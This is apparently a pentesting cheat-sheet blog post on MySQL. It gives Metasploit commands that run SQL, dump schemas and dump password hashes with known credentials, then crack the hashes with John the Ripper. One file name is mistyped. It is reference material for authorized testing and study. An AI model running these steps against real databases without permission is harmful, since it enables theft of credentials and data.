---
layout: post
title: "mysql"
keywords: "mysql, sql, database, db"
---

MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). 

### Enumeration
```
3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1
```

### Establishing a connection
```
mysql -h $IP -u <USERNAME> -p
```

### MSF mysql_sql
```
msfconsole
> use auxiliary/admin/mysql/mysql_sql
> options
> set RHOSTS $IP
> set USERNAME <USERNAME>
> set PASSWORD <PASSWORD>
> set SQL <SQL COMMAND>
> run
```

### MSF mysql_schemadump
```
msfconsole
> use auxiliary/scanner/mysql/mysql_schemadump
> options
> set RHOSTS $IP
> set USERNAME <USERNAME>
> set PASSWORD <PASSWORD>
> run
```

### MSF mysql_hashdump
```
msfconsole
> use auxiliary/scanner/mysql/mysql_hashdump
> options
> set RHOSTS $IP
> set USERNAME <USERNAME>
> set PASSWORD <PASSWORD>
> run

echo <HASH> > hash.txt
john has.txt
```